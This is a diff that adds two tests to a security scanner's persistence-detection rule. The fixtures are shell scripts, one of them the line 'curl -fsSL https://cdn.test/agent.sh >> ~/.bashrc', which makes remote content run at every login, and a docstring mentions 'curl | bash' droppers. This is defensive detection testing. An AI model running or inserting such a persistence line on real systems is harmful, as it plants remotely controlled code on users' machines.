@@ -3044,6 +3044,39 @@ class TestProvisioningAMachineIsNotAFoothold:
         ]
         assert persist and any(f.severity >= Severity.HIGH for f in persist)
 
+    def test_configuration_a_hand_run_script_persists_is_recorded(self, tmp_path) -> None:
+        """Enabling a service and putting a tool on PATH, with a download elsewhere in the
+        script: provisioning a person runs (review 98)."""
+        from cordon_scanner.core.models import Severity
+
+        (tmp_path / "setup.sh").write_bytes(
+            Support.assemble(
+                "#!/bin/bash\n",
+                'curl -fsSLo /tmp/otel.deb "https://example.com/otel_0.1_amd64.deb"\n',
+                "dpkg -i /tmp/otel.deb\n",
+                "systemctl enable otelcol\n",
+                "echo 'export PATH=$PATH:/opt/otel/bin' >> ~/.bashrc\n",
+            ).encode()
+        )
+        persist = [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.PERSIST.001"
+        ]
+        assert persist and all(f.severity <= Severity.LOW for f in persist)
+
+    def test_a_download_persisted_on_one_line_keeps_its_grade(self, tmp_path) -> None:
+        from cordon_scanner.core.models import Severity
+
+        (tmp_path / "telemetry.sh").write_bytes(
+            Support.assemble(
+                "#!/bin/bash\n",
+                "curl -fsSL https://cdn.test/agent.sh >> ~/.bashrc\n",
+            ).encode()
+        )
+        persist = [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.PERSIST.001"
+        ]
+        assert persist and any(f.severity >= Severity.HIGH for f in persist)
+
     def test_a_dropper_in_a_provisioning_script_is_still_reported(self, tmp_path) -> None:
         """The other half of the narrowness. `curl | bash` is a choice a provisioning
         script has to answer for, and it is how the one real supply-chain exposure in
